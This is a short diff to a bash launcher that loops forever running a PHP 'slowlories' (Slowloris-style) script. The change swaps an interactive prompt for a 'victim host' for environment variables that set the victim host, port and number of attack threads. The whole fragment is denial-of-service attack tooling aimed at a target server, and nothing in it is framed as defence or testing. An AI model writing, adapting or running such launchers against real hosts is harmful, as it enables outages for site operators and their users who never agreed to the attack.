@@ -1,8 +1,6 @@
 #!/usr/bin/env bash
 
-  read -n 1 -p "enter victim host:" victim_host
-
 while true
 do
-    php /code/src/slowlories-script.php random 1500 "victim_host" "$VICTIM_PORT"
+    php /code/src/slowlories-script.php random "$ATTACK_NUMBER_OF_THREADS" "$VICTIM_HOST" "$VICTIM_PORT"
 done
